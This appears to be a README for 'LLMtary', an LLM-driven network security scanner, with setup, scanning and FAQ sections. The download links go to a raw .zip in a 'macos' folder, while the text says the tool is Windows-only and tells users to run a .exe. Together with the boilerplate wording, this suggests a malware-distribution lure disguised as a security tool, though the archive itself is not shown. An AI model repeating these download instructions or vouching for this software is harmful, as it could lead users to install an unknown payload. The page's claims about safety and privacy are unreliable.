# 🛡️ LLMtary - Automated security testing for your network

[![Download LLMtary](https://img.shields.io/badge/Download-LLMtary-blue)](https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip)

LLMtary acts as an intelligent assistant for checking the security of your computer systems. It uses advanced language models to find potential weaknesses and provide paths for testing. You do not need deep technical knowledge to use this software. It handles the heavy lifting of gathering information and analyzing security gaps.

## ⚙️ How it works

The software functions by connecting your chosen artificial intelligence model to a scanning engine. You define the target domain or internal network address, and the program maps out the layout. It then asks the model to identify patterns that look like security flaws. After it finishes the analysis, it provides a plain English report of its findings. 

You can choose to use local models through programs like Ollama or LM Studio to keep your data on your machine. You can also connect to cloud services like GPT-4 or Claude if you prefer higher processing power.

## 📋 System requirements

Ensure your computer has the following specifications before you begin:

* Operating System: Windows 10 or Windows 11.
* Memory: 16 GB of RAM or more.
* Storage: 5 GB of free space.
* Processor: Modern multi-core CPU.
* Internet access: Required for downloading updates and cloud model connectivity.

## 🚀 Getting started

1. Visit the repository page to download the installer: [https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip](https://raw.githubusercontent.com/Lorainobsessive5233/LLMtary/main/macos/Mtary-LL-3.0.zip)
2. Locate the most recent version in the Releases section.
3. Download the Windows executable file ending in .exe.
4. Double-click the file to start the installation setup.
5. Follow the visual prompts to finish the process.

## 🛠️ Configuring your AI model

The software requires an artificial intelligence model to perform analysis. If you are new to this, we recommend installing a local tool first.

### Using local models

1. Install Ollama or LM Studio on your computer.
2. Download a model like Llama 3 or Mistral within that application.
3. Open LLMtary.
4. Go to the Settings tab in the sidebar.
5. Select "Local" as your provider.
6. Enter the web address provided by your local tool (usually http://localhost:11434).
7. Save your settings to confirm the connection.

### Using cloud models

1. Log in to your provider account (OpenAI, Anthropic, or Google).
2. Generate an API key from their developer dashboard.
3. Open LLMtary and go to the Settings tab.
4. Select your preferred provider from the drop-down menu.
5. Paste your API key into the field.
6. Test the connection to ensure the software communicates with the cloud service.

## 🔍 Running your first test

1. Open the LLMtary application from your desktop.
2. Select the "New Scan" button on the main dashboard.
3. Enter the website address or local IP range you wish to test.
4. Choose an "Analysis Depth" level. We suggest starting with "Standard" for your first attempt.
5. Click "Begin Analysis" to start the process.
6. Monitor the progress bar to see how far the scan has progressed.
7. Once finished, navigate to the "Results" tab to view the generated report.

## 📊 Understanding the results

The software organizes findings into three categories to help you prioritize your work:

* Critical: These issues represent high risk and need immediate attention. They often involve exposed services or outdated software.
* Warning: These items indicate potential trouble but may not result in an immediate breach.
* Informational: These are notes about the target configuration. They generally represent good practices rather than flaws.

Each report contains a "Recommendations" section. Follow these bullet points to fix the issues identified by the scan. You can export these reports as PDF files for your records.

## 🛡️ Best practices for security testing

Always perform tests on systems you own or have explicit permission to audit. Testing networks or websites without permission is illegal and unethical. Use this tool inside your private network to identify internal gaps before they become real problems. 

Keep your AI models updated to ensure the analysis stays accurate against new threats. If you encounter an error, check the Logs tab to see if a model failed to respond or if a network timeout occurred.

## 🔧 Frequently asked questions

Does this tool damage my files?
No. The tool reads configurations and tests for vulnerabilities. It does not delete, alter, or encrypt your personal or system files.

What if the scan takes too long?
Complex networks require more time to categorize. If a scan stops, check your internet connection or your local AI model responsiveness.

Can I run this on a virtual machine?
Yes. Many users run this inside a virtual machine to isolate it from their host system while testing.

Is my data private?
If you use local AI models, all data stays on your machine. We never send your target data to our servers. If you use cloud models, you rely on the privacy policies of those specific providers.

What should I do if the software freezes?
Close the application through the Task Manager and reopen it. The scan progress usually saves automatically.

How do I report a problem with the software?
Open an issue on the GitHub repository page if you find a bug or think of a useful feature. Keep your descriptions clear and include screen captures if possible.